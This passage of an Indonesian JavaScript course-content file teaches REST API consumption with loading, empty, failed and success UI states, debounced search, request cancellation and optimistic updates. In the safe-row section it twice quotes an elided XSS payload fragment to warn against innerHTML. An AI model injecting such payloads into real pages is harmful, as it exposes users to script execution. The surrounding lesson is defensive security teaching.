        'Satu pembungkus = satu tempat untuk timeout, header, dan bentuk error.',
        'Kelas `ApiError` sendiri membuat pemanggil bisa membedakan jenis kegagalan.',
        'Jangan sentuh `Content-Type` saat body-nya `FormData`.',
        '`204` tidak punya body.',
        'Retry otomatis hanya untuk `GET`, kecuali ada idempotency key.',
      ),
      references(
        {
          label: 'Error: cause',
          href: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause',
          source: 'MDN',
          note: 'Menjaga penyebab asli tetap terbaca saat wrapper membungkusnya jadi `ApiError`.',
        },
        {
          label: 'extends',
          href: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes/extends',
          source: 'MDN',
          note: 'Dasar pembuatan `class ApiError extends Error` — pola yang sama dengan Sub-bab 2.7.',
        },
        {
          label: 'AbortSignal: any() static method',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/AbortSignal/any_static',
          source: 'MDN',
          note: 'Menggabungkan timeout wrapper dengan signal pembatalan milik pemanggil.',
        },
        {
          label: 'Idempotency-Key Header Field',
          href: 'https://datatracker.ietf.org/doc/html/draft-ietf-httpapi-idempotency-key-header',
          source: 'IETF',
          note: 'Syarat agar `POST` pun aman diulang otomatis oleh wrapper.',
        },
        {
          label: '429 Too Many Requests',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/429',
          source: 'MDN',
          note: 'Salah satu status yang dianggap `bisaDiulang` oleh `ApiError` di atas.',
        },
      ),
    ],
  ),

  written(
    'praktik-konsumsi-api',
    'Praktik: Konsumsi REST API dengan empat keadaan UI',
    28,
    'Menggabungkan fetch, DOM, dan penanganan error menjadi tampilan yang jujur.',
    [
      p(
        'Praktik penutup Bab 5. Kamu akan membangun daftar yang mengambil data dari API sungguhan, menangani **keempat keadaan UI**, membatalkan pencarian yang sudah usang, dan tidak pernah berbohong tentang apa yang sedang terjadi.',
      ),

      terms(
        {
          term: 'empat keadaan UI',
          meaning:
            'Setiap tampilan yang mengambil data punya **empat** kemungkinan keadaan, bukan satu: **memuat**, **kosong**, **gagal**, dan **berhasil**. Melewatkan tiga di antaranya adalah cacat yang paling sering sampai ke produksi — hampir semua tutorial hanya menunjukkan yang terakhir.',
        },
        {
          term: 'skeleton',
          meaning:
            'Terjemahannya **kerangka**. Bentuk abu-abu yang menyerupai isi sebenarnya, ditampilkan selama memuat. Keunggulannya atas pemutar berputar bukan sekadar estetika: ia **memesan ruang** dengan ukuran yang mendekati isi akhir, sehingga tata letak tidak melompat saat datanya tiba.',
        },
        {
          term: 'layout shift',
          meaning:
            'Terjemahannya **pergeseran tata letak**. Isi halaman yang melompat karena sesuatu muncul dan mendorong yang lain. Sangat mengganggu — pengguna bisa salah menekan tombol karena posisinya berubah tepat saat ia mengklik.',
        },
        {
          term: 'empty state',
          meaning:
            'Terjemahan dari *empty state*. Wajib menjelaskan **kenapa** kosong dan memberi **satu langkah lanjutan**. Perhatikan bahwa penyebabnya bisa berbeda: belum ada data sama sekali, atau ada tapi tidak cocok dengan saringan — dan keduanya butuh pesan yang berbeda.',
        },
        {
          term: 'debounce',
          meaning:
            'Menunda sebuah aksi sampai pemicunya berhenti berdatangan. Pada kotak pencarian, ia mencegah sepuluh huruf menghasilkan sepuluh permintaan. Dipasangkan dengan pembatalan, ia juga menutup masalah respons lama yang menimpa hasil baru.',
        },
        {
          term: 'race condition (di UI)',
          meaning:
            'Respons untuk kata kunci **lama** tiba setelah respons kata kunci baru, lalu menimpanya di layar. Pengguna melihat hasil untuk sesuatu yang sudah tidak ia ketik. Obatnya sudah kamu pelajari di Sub-bab 3.8: batalkan permintaan sebelumnya sebelum mengirim yang baru.',
        },
        {
          term: 'aria-busy',
          meaning:
            'Atribut yang memberi tahu pembaca layar bahwa sebuah area **sedang diperbarui**, sehingga ia tidak membacakan isi setengah jadi. Dipasangkan dengan `aria-live` untuk mengumumkan hasilnya setelah selesai.',
        },
        {
          term: 'jujur',
          meaning:
            'Prinsip yang mendasari seluruh praktik ini: tampilan **tidak boleh menyembunyikan keadaan sebenarnya**. Layar kosong tanpa penjelasan tidak bisa dibedakan dari aplikasi yang rusak, dan pengguna akan menganggapnya rusak. Menampilkan kegagalan dengan jelas lebih baik daripada terlihat rapi tapi menyesatkan.',
        },
      ),

      h2('Empat keadaan — bukan satu'),
      table(
        ['Keadaan', 'Yang wajib ditampilkan'],
        [
          ['**Memuat**', 'Indikator yang **memesan ruang**, supaya tata letak tidak melompat'],
          ['**Kosong**', 'Sebabnya, plus satu langkah lanjutan yang jelas'],
          ['**Gagal**', 'Pesan yang bisa ditindaklanjuti + tombol coba lagi'],
          ['**Berhasil**', 'Datanya'],
        ],
      ),
      callout(
        'danger',
        'Melewatkan tiga di antaranya adalah cacat yang paling sering sampai produksi',
        'Hampir semua tutorial hanya menunjukkan keadaan berhasil. Halaman yang kosong tanpa penjelasan tidak bisa dibedakan dari halaman yang rusak — dan pengguna akan menganggapnya rusak.',
      ),

      h2('1. Struktur'),
      code(
        'html',
        `
        <section>
          <label for="cari" class="sr-only">Cari</label>
          <input id="cari" type="search" autocomplete="off" spellcheck="false"
                 placeholder="Cari pengguna…" />

          <div id="wadah" aria-live="polite" aria-busy="false"></div>
        </section>
        `,
      ),
      p(
        'Seluruh isi wadah nanti dibangun dari data, jadi HTML ini hanya menyiapkan **bejananya**, dan justru di bejana itulah keputusan aksesibilitasnya berada. `type="search"` memberi tombol hapus bawaan dan keyboard yang sesuai di perangkat sentuh. `autocomplete="off"` dan `spellcheck="false"` mematikan dua bantuan browser yang hanya mengganggu pada kotak pencarian. Yang paling menentukan ada di `<div id="wadah">`, sebab `aria-live="polite"` menandai isinya sebagai berubah-ubah, sehingga pembaca layar mengumumkan hasil baru **tanpa memindahkan fokus** pengguna dari kotak ketik, dan nilai `polite` berarti menunggu jeda alih-alih menyela. `aria-busy` menyertainya untuk menandai bahwa isinya sedang dimuat, dan nilainya diperbarui dari JavaScript di langkah berikutnya.',
      ),
      callout(
        'tip',
        '`aria-live` dan `aria-busy` bukan hiasan',
        'Tanpanya, pengguna screen reader tidak tahu bahwa isi wadah baru saja berubah dari "memuat" menjadi "12 hasil". Keduanya adalah cara memberi tahu perubahan yang terjadi tanpa memindahkan fokus.',
      ),

      h2('2. Satu fungsi render untuk semua keadaan'),
      code(
        'js',
        `
        const wadah = document.querySelector('#wadah');

        function render(keadaan) {
          wadah.replaceChildren();
          wadah.setAttribute('aria-busy', String(keadaan.status === 'memuat'));

          if (keadaan.status === 'memuat') {
            for (let i = 0; i < 5; i++) {
              const baris = document.createElement('div');
              baris.className = 'skeleton';      // tinggi SAMA dengan baris asli
              wadah.append(baris);
            }
            return;
          }

          if (keadaan.status === 'gagal') {
            const kotak = document.createElement('div');
            kotak.className = 'error';
            kotak.setAttribute('role', 'alert');

            const pesan = document.createElement('p');
            pesan.textContent = keadaan.pesan;

            const ulang = document.createElement('button');
            ulang.type = 'button';
            ulang.textContent = 'Coba lagi';
            ulang.addEventListener('click', () => muat(terakhirDicari));

            kotak.append(pesan, ulang);
            wadah.append(kotak);
            return;
          }

          if (keadaan.data.length === 0) {
            const kosong = document.createElement('p');
            kosong.className = 'kosong';
            kosong.textContent = terakhirDicari
              ? \`Tidak ada hasil untuk "\${terakhirDicari}". Coba kata kunci lain.\`
              : 'Belum ada data. Mulai mengetik untuk mencari.';
            wadah.append(kosong);
            return;
          }

          const fragment = document.createDocumentFragment();
          for (const item of keadaan.data) fragment.append(buatBaris(item));
          wadah.append(fragment);
        }
        `,
      ),
      p(
        'Satu fungsi menangani **keempat** keadaan, dan bentuknya sengaja memakai `return` di ujung tiap cabang mengikuti pola guard clause dari Bab 1, sehingga tidak ada `else` bertingkat dan tiap keadaan terbaca sebagai blok yang berdiri sendiri. Perhatikan urutannya bukan kebetulan, yaitu memuat, gagal, kosong, lalu berhasil. Cabang **memuat** menampilkan lima baris skeleton dengan tinggi yang sama seperti baris asli, sehingga tata letak tidak melompat saat data tiba. Cabang **gagal** memakai `role="alert"` supaya diumumkan segera, dan menyertakan tombol "Coba lagi" yang memanggil `muat(terakhirDicari)`, karena pesan error tanpa jalan keluar hanya membuat pengguna buntu. Cabang **kosong** membedakan dua situasi yang sangat berbeda, yaitu "belum mencari apa pun" dan "sudah mencari tapi tidak ketemu", masing-masing dengan kalimatnya sendiri. Baru cabang terakhir yang menampilkan data, dirakit lewat `DocumentFragment` seperti pola batching di bab DOM.',
      ),

      h2('3. Mengambil data, dengan pembatalan'),
      code(
        'js',
        `
        let kontrolAktif = null;
        let terakhirDicari = '';

        async function muat(kata) {
          terakhirDicari = kata;

          kontrolAktif?.abort();                 // batalkan pencarian sebelumnya
          kontrolAktif = new AbortController();

          render({ status: 'memuat' });

          try {
            const url = new URL('https://jsonplaceholder.typicode.com/users');
            if (kata) url.searchParams.set('q', kata);

            const res = await fetch(url, {
              signal: AbortSignal.any([
                kontrolAktif.signal,
                AbortSignal.timeout(10_000),
              ]),
            });

            if (!res.ok) throw new Error(\`Server balas \${res.status}\`);

            const semua = await res.json();

            // API contoh ini tidak menyaring — kita saring di klien
            const data = kata
              ? semua.filter((u) => u.name.toLowerCase().includes(kata.toLowerCase()))
              : semua;

            render({ status: 'berhasil', data });
          } catch (error) {
            if (error.name === 'AbortError') return;    // digantikan pencarian baru

            console.error('[muat]', error);

            render({
              status: 'gagal',
              pesan:
                error.name === 'TimeoutError'
                  ? 'Server tidak menjawab. Periksa koneksimu lalu coba lagi.'
                  : 'Gagal memuat data. Coba lagi sebentar.',
            });
          }
        }
        `,
      ),
      p(
        'Dua baris pertama fungsi ini yang membuat pencarian terasa benar. `kontrolAktif?.abort()` **membatalkan pencarian sebelumnya** sebelum memulai yang baru, sehingga respons lama tidak akan pernah menimpa hasil yang lebih baru. Ini persis masalah race condition dari sub-bab jebakan async, diselesaikan dengan pembatalan alih-alih penomoran. Tanda `?.` diperlukan karena pada pemanggilan pertama belum ada controller apa pun. `AbortSignal.any([...])` menggabungkan dua alasan berhenti yang berbeda, yaitu pencarian digantikan yang baru **atau** server terlalu lambat. Di blok `catch`, urutannya juga menentukan. `AbortError` disaring lebih dulu dan **keluar tanpa menampilkan apa-apa**, karena pembatalan yang kita sengaja lakukan bukan kegagalan, dan menampilkannya sebagai error justru akan membuat layar berkedip merah setiap kali pengguna mengetik satu huruf lagi.',
      ),

      h2('4. Debounce pada input'),
      code(
        'js',
        `
        function debounce(fn, jeda) {
          let timer;
          return (...args) => {
            clearTimeout(timer);
            timer = setTimeout(() => fn(...args), jeda);
          };
        }

        const cariTertunda = debounce((kata) => muat(kata), 300);

        document.querySelector('#cari').addEventListener('input', (e) => {
          cariTertunda(e.target.value.trim());
        });

        muat('');   // muat awal
        `,
      ),
      p(
        "Fungsi `debounce` di sini adalah yang sama persis dari sub-bab closure, dengan timer disimpan di closure sehingga bertahan antar-pemanggilan, dan tiap ketikan baru membatalkan penundaan sebelumnya lewat `clearTimeout`. Perhatikan `cariTertunda` dibuat **sekali di luar** listener, sebab membuatnya di dalam listener akan menghasilkan timer baru tiap ketikan dan tidak ada yang pernah dibatalkan. `e.target.value.trim()` membersihkan spasi sebelum dikirim, sehingga mengetik spasi tidak memicu pencarian yang berbeda. Baris `muat('')` di akhir memuat data awal saat halaman dibuka, sebab tanpa itu pengguna disambut wadah kosong sampai ia mengetik sesuatu. Seperti disebut di kotak berikut, debounce dan pembatalan **bukan pengganti satu sama lain**, karena yang pertama mengurangi jumlah permintaan sedangkan yang kedua mengurus permintaan yang terlanjur berangkat.",
      ),
      callout(
        'info',
        'Debounce dan pembatalan menyelesaikan masalah berbeda',
        '**Debounce** mengurangi jumlah permintaan yang dikirim. **Pembatalan** memastikan respons yang sudah usang tidak menimpa yang baru. Kamu butuh keduanya: debounce saja masih bisa menghasilkan dua permintaan yang tiba tidak berurutan.',
      ),

      h2('5. Baris yang aman'),
      code(
        'js',
        `
        function buatBaris(pengguna) {
          const li = document.createElement('li');
          li.dataset.id = pengguna.id;

          const nama = document.createElement('strong');
          nama.textContent = pengguna.name;       // AMAN — bukan innerHTML

          const email = document.createElement('span');
          email.textContent = pengguna.email;

          li.append(nama, ' — ', email);
          return li;
        }
        `,
      ),
      p(
        'Perhatikan baris `li.append(nama, \' — \', email)`, sebab satu pemanggilan menyisipkan dua elemen **dan** satu potongan teks biasa sekaligus. Itu bentuk `append` modern dari sub-bab membuat node, dan string yang dioper ke sana selalu diperlakukan sebagai teks, jadi tanda pemisah bisa ditulis langsung tanpa perlu membuat elemen pembungkus. Dua penugasan `textContent` di atasnya adalah inti keamanannya, dan penting disadari bahwa **`pengguna.name` datang dari API, bukan dari kodemu**. Data API terasa "resmi" sehingga mudah dianggap aman, padahal isinya diketik seseorang di suatu tempat, sebab nama, biodata, dan komentar semuanya masukan pengguna yang kebetulan singgah di server lebih dulu. Memakai `innerHTML` di sini akan membuat payload `<img src=x onerror=...>` berjalan di browser pembacamu, persis skenario XSS dari bab DOM.',
      ),
      callout(
        'warning',
        'Data dari API adalah input tidak tepercaya',
        'Nama pengguna itu diketik seseorang. Kalau ia berisi `<img src=x onerror=...>` dan kamu memakai `innerHTML`, skripnya berjalan di browser pembacamu. `textContent` menutup jalur itu sepenuhnya.',
      ),

      checklist(
        'frontend-basic/ajax-web-api/praktik',
        'Checklist praktik 5.12',
        'Keempat keadaan UI ditangani: memuat, kosong, gagal, berhasil',
        'Skeleton memesan tinggi yang sama dengan baris asli — tata letak tidak melompat',
        'Dua empty state dibedakan: belum mencari vs tidak ada hasil',
        'Keadaan gagal punya pesan yang bisa ditindaklanjuti dan tombol coba lagi',
        'Pencarian lama dibatalkan; `AbortError` tidak ditampilkan sebagai error',
        'Ada timeout pada setiap permintaan',
        'Input di-debounce, dan pembatalan tetap dipasang',
        'Tidak ada satu pun `innerHTML` untuk data dari API',
        '`aria-live` dan `aria-busy` dipasang pada wadah hasil',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Praktik ini menutup seluruh bab dengan satu layar yang mengonsumsi API sungguhan, yaitu halaman daftar pesanan dengan pencarian, filter status, paginasi, dan tombol batalkan per baris. Yang membuatnya layak ditulis lengkap bukan jumlah fiturnya melainkan bahwa keempat keadaan tampilan harus benar sekaligus, dan itu justru bagian yang paling sering dilewati.',
      ),
      code(
        'js',
        `
        import { buatKlien } from '../api/klien.js';
        import { ErrorJaringan, ErrorSesi, ErrorValidasi } from '../api/galat.js';

        const klien = buatKlien({ dasar: '/api' });

        const keadaan = {
          status: 'awal',      // awal | memuat | sukses | kosong | gagal
          data: [],
          galat: null,
          halaman: 1,
          filter: { q: '', status: '' },
        };

        let kendaliTerakhir = null;
        let idPermintaan = 0;

        async function muat() {
          const idSaya = ++idPermintaan;

          // Batalkan yang sebelumnya, supaya tidak ada respons basi.
          kendaliTerakhir?.abort(new DOMException('Permintaan baru', 'AbortError'));
          const kendali = new AbortController();
          kendaliTerakhir = kendali;

          // Jangan tampilkan skeleton kalau sudah ada data. Ganti jadi penanda kecil.
          keadaan.status = keadaan.data.length > 0 ? 'memuat-ulang' : 'memuat';
          gambar();

          try {
            const params = new URLSearchParams();
            if (keadaan.filter.q.trim()) params.set('q', keadaan.filter.q.trim());
            if (keadaan.filter.status) params.set('status', keadaan.filter.status);
            if (keadaan.halaman > 1) params.set('halaman', String(keadaan.halaman));

            const kueri = params.toString();
            const hasil = await klien.ambil(\`/pesanan\${kueri ? \`?\${kueri}\` : ''}\`, {
              sinyal: kendali.signal,
            });

            if (idSaya !== idPermintaan) return;      // sudah usang, diamkan

            keadaan.data = hasil.item;
            keadaan.status = hasil.item.length === 0 ? 'kosong' : 'sukses';
            keadaan.galat = null;
          } catch (galat) {
            if (galat.name === 'AbortError') return;  // bukan kegagalan
            if (idSaya !== idPermintaan) return;

            keadaan.status = 'gagal';
            keadaan.galat = galat;
          } finally {
            if (idSaya === idPermintaan) gambar();
          }
        }
        `,
        { filename: 'src/pesanan/muat.js' },
      ),
      p(
        "Baris `keadaan.data.length > 0 ? 'memuat-ulang' : 'memuat'` menutup masalah pengalaman yang sangat sering. Saat pengguna mengganti filter, menampilkan skeleton berarti membuang daftar yang sudah ada dan membuat layar berkedip. Yang lebih baik adalah mempertahankan data lama sambil menampilkan penanda kecil, sehingga pengguna melihat perubahan bukan kekosongan. Skeleton penuh hanya untuk pemuatan pertama.",
      ),
      p(
        'Penjaga `idSaya !== idPermintaan` muncul **tiga kali**, yaitu di jalur sukses, di jalur gagal, dan di `finally`. Ketiganya diperlukan. Tanpa penjaga di jalur gagal, permintaan lama yang kehabisan waktu akan menimpa hasil permintaan baru yang sudah berhasil dengan pesan kesalahan. Ini bug yang sangat sulit direproduksi karena butuh urutan waktu tertentu, dan sangat sering terjadi pada pencarian yang diketik cepat.',
      ),
      code(
        'js',
        `
        function gambar() {
          const wadah = document.getElementById('daftar-pesanan');

          if (keadaan.status === 'memuat') return gambarSkeleton(wadah, 5);

          if (keadaan.status === 'gagal') {
            const pesan =
              keadaan.galat instanceof ErrorJaringan
                ? 'Koneksi bermasalah. Periksa jaringanmu.'
                : 'Gagal memuat pesanan. Coba lagi sebentar.';
            return gambarGagal(wadah, pesan, { onCobaLagi: muat });
          }

          if (keadaan.status === 'kosong') {
            const adaFilter = keadaan.filter.q || keadaan.filter.status;
            return gambarKosong(wadah, {
              // Pesan kosong yang BERBEDA untuk dua sebab yang berbeda.
              pesan: adaFilter
                ? 'Tidak ada pesanan yang cocok dengan filter ini'
                : 'Belum ada pesanan sama sekali',
              aksi: adaFilter
                ? { label: 'Hapus filter', jalankan: bersihkanFilter }
                : { label: 'Buat pesanan pertama', jalankan: keFormBaru },
            });
          }

          gambarBaris(wadah, keadaan.data);
          wadah.setAttribute('aria-busy', String(keadaan.status === 'memuat-ulang'));
        }
        `,
        { filename: 'src/pesanan/gambar.js' },
      ),
      p(
        'Bagian keadaan kosong itu yang paling sering dikerjakan asal-asalan, dan perbedaannya nyata bagi pengguna. Daftar kosong karena filter terlalu sempit dan daftar kosong karena memang belum ada apa-apa adalah dua keadaan yang berbeda, dan keduanya menuntut tindakan berikutnya yang berbeda. Menampilkan tulisan tidak ada data untuk keduanya membuat pengguna baru mengira aplikasinya rusak, dan membuat pengguna lama tidak tahu bahwa filternya yang perlu dilonggarkan.',
      ),
      p(
        'Pesan kegagalan juga dibedakan berdasarkan jenisnya. Gangguan jaringan adalah sesuatu yang bisa pengguna perbaiki sendiri dengan memeriksa koneksinya, sedangkan gangguan server bukan. Membedakan keduanya berarti pengguna tidak membuang waktu mencari masalah di tempat yang salah.',
      ),
      code(
        'js',
        `
        // Aksi per baris, dengan delegasi dan pembaruan optimistis yang bisa dibatalkan.
        document.getElementById('daftar-pesanan').addEventListener('click', async (peristiwa) => {
          const tombol = peristiwa.target.closest('[data-aksi="batalkan"]');
          if (!tombol) return;

          const baris = tombol.closest('[data-pesanan-id]');
          const id = baris?.dataset.pesananId;
          if (!id) return;

          const sebelumnya = keadaan.data;
          // Optimistis: ubah tampilan LEBIH DULU supaya terasa seketika.
          keadaan.data = keadaan.data.map((p) => (p.id === id ? { ...p, status: 'batal' } : p));
          gambar();

          tombol.disabled = true;
          try {
            await klien.kirim(\`/pesanan/\${id}/batalkan\`, {});
          } catch (galat) {
            keadaan.data = sebelumnya;          // gagal, kembalikan seperti semula
            gambar();
            if (galat instanceof ErrorValidasi) tampilkanBanner(galat.message);
            else if (galat instanceof ErrorSesi) return keHalamanMasuk();
            else tampilkanBanner('Gagal membatalkan, coba lagi');
          } finally {
            tombol.disabled = false;
          }
        });
        `,
        { filename: 'src/pesanan/aksi.js' },
      ),
      p(
        'Pembaruan optimistis membuat aplikasi terasa seketika, dan syarat mutlaknya adalah kemampuan mengembalikan keadaan kalau gagal. Variabel `sebelumnya` menyimpan array lama, dan karena seluruh perubahan menghasilkan array baru seperti dibahas di Bab 1, menyimpan rujukan lamanya sudah cukup. Kalau `map` diganti dengan perubahan di tempat, pengembalian ini tidak akan bekerja karena array lamanya ikut berubah.',
      ),
      p(
        'Perhatikan pola optimistis ini hanya pantas untuk aksi yang **hampir selalu berhasil** dan akibat kegagalannya ringan. Untuk pembayaran atau penghapusan permanen, tunggu jawaban server lebih dulu, sebab menampilkan berhasil lalu menariknya kembali jauh lebih membingungkan daripada menunggu sebentar.',
      ),
      callout(
        'tip',
        'Urutan membangun layar yang mengonsumsi API',
        'Mulai dari keadaan gagal dan keadaan kosong, bukan dari keadaan sukses. Keduanya paling sering dilewati justru karena paling jarang muncul saat mengembangkan. Kalau kamu menulisnya lebih dulu, jalur suksesnya akan menyusul dengan sendirinya dan tidak ada keadaan yang tertinggal.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut adalah yang paling sering muncul saat layar seperti ini pertama kali dipakai orang lain, dan seluruhnya hanya terlihat pada jaringan yang tidak sempurna.',
      ),
      code(
        'text',
        `
        # Pengguna mengetik 'kaos' lalu melanjutkan menjadi 'kaos polos'.
        # Jaringan lambat, dan jawaban untuk 'kaos' datang belakangan.

        Layar menampilkan hasil untuk 'kaos'.
        `,
        { caption: 'Respons basi menimpa hasil yang lebih baru.' },
      ),
      p(
        'Tidak ada error dan tidak ada tanda apa pun. Dua penjaga sekaligus dipakai pada studi kasus di atas, yaitu membatalkan permintaan sebelumnya dan memeriksa nomor urut. Keduanya bukan pengulangan yang mubazir. Pembatalan menghentikan permintaan yang masih berjalan, dan nomor urut menangkap kasus permintaan yang sudah terlanjur selesai tepat sebelum dibatalkan.',
      ),
      code(
        'text',
        `
        # Pengguna mengganti filter tiga kali dengan cepat.

        Uncaught (in promise) AbortError: This operation was aborted
        `,
        { caption: 'Pembatalan yang disengaja diperlakukan sebagai kegagalan.' },
      ),
      p(
        "Setiap penggantian filter membatalkan permintaan sebelumnya, dan pembatalan itu melempar. Kalau `catch` tidak memeriksa `AbortError` lebih dulu, pengguna akan melihat pesan kegagalan setiap kali ia menyentuh filter. Baris `if (galat.name === 'AbortError') return` harus menjadi baris pertama di dalam `catch`, sebelum pemeriksaan jenis lain apa pun.",
      ),
      code(
        'text',
        `
        # Server sedang gangguan. Tombol batalkan ditekan.

        Baris berubah menjadi 'batal' di layar, lalu kembali normal satu detik kemudian.
        Tidak ada pesan apa pun.
        `,
        { caption: 'Pembaruan optimistis dikembalikan tanpa memberi tahu alasannya.' },
      ),
      p(
        'Mengembalikan keadaan saja tidak cukup. Dari sudut pandang pengguna, tombolnya seolah berkedip lalu tidak melakukan apa-apa, dan ia akan menekannya lagi. Pengembalian keadaan **wajib** dipasangkan dengan pesan yang menjelaskan kenapa. Pada studi kasus di atas, `tampilkanBanner` dipanggil di ketiga cabang penanganan galat justru untuk ini.',
      ),
      code(
        'text',
        `
        # Filter menghasilkan nol hasil.

        Layar menampilkan: "Belum ada pesanan sama sekali"
        # Padahal ada 4.000 pesanan, hanya filternya yang terlalu sempit.
        `,
        { caption: 'Satu pesan kosong dipakai untuk dua sebab yang berbeda.' },
      ),
      p(
        'Pengguna yang membaca pesan itu akan menyimpulkan datanya hilang, dan kalau ia admin yang baru saja mengganti filter, ia bisa panik. Membedakan keduanya hanya butuh satu pemeriksaan apakah ada filter yang aktif, dan hasilnya adalah pesan yang menjelaskan keadaan sebenarnya beserta tombol yang benar-benar menolong.',
      ),
      table(
        ['Gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            'Layar menampilkan hasil pencarian yang lama',
            'Respons basi menimpa yang baru',
            'Batalkan yang sebelumnya, dan periksa nomor urut sesudah `await`',
          ],
          [
            '`AbortError` muncul sebagai pesan kegagalan',
            'Pembatalan disengaja tidak dibedakan',
            "Periksa `galat.name === 'AbortError'` sebagai baris pertama `catch`",
          ],
          [
            'Perubahan optimistis kembali tanpa penjelasan',
            'Keadaan dikembalikan tanpa pesan',
            'Selalu pasangkan pengembalian keadaan dengan pesan yang menjelaskan',
          ],
          [
            'Pesan kosong menyesatkan',
            'Satu pesan untuk kosong karena filter dan kosong karena belum ada data',
            'Bedakan keduanya, dan sediakan aksi yang berbeda',
          ],
          [
            'Daftar berkedip tiap kali filter diganti',
            'Skeleton ditampilkan walaupun sudah ada data',
            'Pertahankan data lama, dan pakai penanda kecil untuk pemuatan ulang',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Layar yang mengonsumsi API adalah tempat seluruh materi bab bertemu, dan kesalahan yang muncul di sini hampir selalu berupa keadaan yang tidak dipikirkan sejak awal.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Hanya menulis jalur sukses lebih dulu',
            'Itu yang paling penting',
            'Keadaan memuat, kosong, dan gagal menyusul sebagai tambalan yang tidak konsisten. Tulis keempatnya sejak awal',
          ],
          [
            'Memakai satu pesan kosong untuk semua sebab',
            'Sama-sama tidak ada data',
            'Pengguna tidak tahu apakah harus melonggarkan filter atau membuat data pertamanya',
          ],
          [
            'Menampilkan skeleton penuh pada tiap pemuatan ulang',
            'Konsisten dengan pemuatan pertama',
            'Layar berkedip tiap kali filter diganti. Pertahankan data lama dengan penanda kecil',
          ],
          [
            'Melakukan pembaruan optimistis tanpa menyimpan keadaan lama',
            'Servernya kan hampir selalu berhasil',
            'Saat gagal, tidak ada yang bisa dikembalikan dan layar menampilkan keadaan yang salah selamanya',
          ],
          [
            'Menguji hanya di jaringan cepat',
            'Alurnya kan sama',
            'Respons basi, keadaan memuat yang berkedip, dan pembatalan semuanya hanya muncul saat lambat. Pakai pembatas jaringan di DevTools',
          ],
          [
            'Menyimpan filter hanya di memori',
            'Pengguna toh sedang di halaman itu',
            'Muat ulang dan berbagi tautan mengembalikan filter ke bawaan. Simpan di parameter alamat',
          ],
        ],
      ),
      p(
        'Baris terakhir punya keuntungan tambahan yang sering tidak terpikirkan. Menyimpan filter di parameter alamat berarti keadaan layar bisa dibagikan lewat tautan, bisa dibuka di tab baru, dan bisa dikembalikan dengan tombol kembali tanpa satu baris kode tambahan. Alamat halaman adalah tempat penyimpanan keadaan yang sudah tersedia dan sudah dipahami setiap pengguna, dan mengabaikannya berarti membangun ulang sesuatu yang sudah ada.',
      ),
      callout(
        'info',
        'Semua ini akan disediakan pustaka di kategori berikutnya',
        'Pembatalan otomatis, penjaga respons basi, keadaan memuat dan gagal, pembaruan optimistis beserta pengembaliannya, dan cache semuanya adalah kemampuan bawaan pustaka pengambil data yang dibahas di Frontend Intermediate. Menulisnya sekali dengan tangan seperti di sini membuat pustaka itu terbaca sebagai penyingkat pekerjaan yang sudah kamu pahami, dan membuat kamu tahu apa yang harus diperiksa saat perilakunya tidak seperti dugaan.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Empat keadaan UI adalah kewajiban, bukan kemewahan.',
        'Skeleton harus memesan ruang, bukan sekadar berputar.',
        'Bedakan "belum mencari" dari "tidak ada hasil".',
        'Debounce mengurangi permintaan; pembatalan mencegah respons usang menimpa yang baru.',
        '`AbortError` bukan kegagalan — jangan tampilkan ke pengguna.',
        'Data dari API tetap input tidak tepercaya.',
      ),
      references(
        {
          label: 'aria-busy',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Reference/Attributes/aria-busy',
          source: 'MDN',
          note: 'Mencegah pembaca layar membacakan isi yang masih setengah jadi.',
        },
        {
          label: 'aria-live',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Reference/Attributes/aria-live',
          source: 'MDN',
          note: 'Mengumumkan hasil pencarian setelah selesai dimuat, tanpa memotong pengguna.',
        },
        {
          label: 'Cumulative Layout Shift (CLS)',
          href: 'https://web.dev/articles/cls',
          source: 'web.dev',
          note: 'Alasan skeleton harus memesan ruang, bukan sekadar berputar di tengah.',
        },
        {
          label: 'AbortController',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/AbortController',
          source: 'MDN',
          note: 'Pembatalan yang mencegah respons usang menimpa hasil yang lebih baru.',
        },
        {
          label: 'Empty states',
          href: 'https://web.dev/articles/building-a-loading-bar-component',
          source: 'web.dev',
          note: 'Pola menampilkan kemajuan yang jujur alih-alih layar kosong tanpa penjelasan.',
        },
      ),
    ],
  ),
];
